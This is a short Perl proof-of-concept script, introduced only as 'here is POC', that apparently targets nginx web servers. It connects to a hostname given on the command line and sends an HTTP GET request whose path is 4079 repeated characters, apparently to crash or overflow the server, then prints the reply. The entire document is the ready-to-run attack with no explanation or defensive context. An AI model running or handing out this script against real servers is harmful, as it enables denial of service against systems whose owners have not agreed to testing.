here is POC:

#!/usr/bin/perl
use IO::Socket;
if ($#ARGV != 0) {
print "Usage: ./nginx.pl <hostname>\n";
exit;}
$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
PeerPort => '80',
Proto => 'tcp');
$mysize = 4079;
$mymsg = "o" x $mysize;
print $sock "GET /$mymsg HTTP/1.1\r\n\r\n";

while(<$sock>) {
print;
}
